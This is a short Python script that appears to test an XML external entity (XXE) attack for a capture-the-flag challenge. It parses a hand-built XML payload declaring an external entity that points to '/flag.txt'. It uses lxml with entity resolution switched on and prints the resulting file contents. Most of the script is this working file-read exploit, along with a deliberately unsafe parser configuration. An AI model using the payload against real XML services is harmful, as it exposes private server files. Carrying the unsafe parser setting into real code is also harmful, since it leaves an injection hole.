from flask import Flask, request, render_template_string, render_template
from lxml import etree

#app = Flask(__name__)

#if __name__ == '__main__':
#    app.run(debug=True, port=80)


xml_data = b'<!--?xml version="1.0" ?--><!DOCTYPE foo [<!ENTITY flag SYSTEM "/flag.txt"> ]><root><feedback>&flag;</feedback></root>'
parser = etree.XMLParser(resolve_entities=True)
root = etree.fromstring(xml_data, parser=parser)
print(root)
feedback_element = root.find('feedback')
print(feedback_element)
for i in feedback_element:
    print(i)
feedback = feedback_element.text
print(feedback)
    #print(render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback))
    #print(render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>'))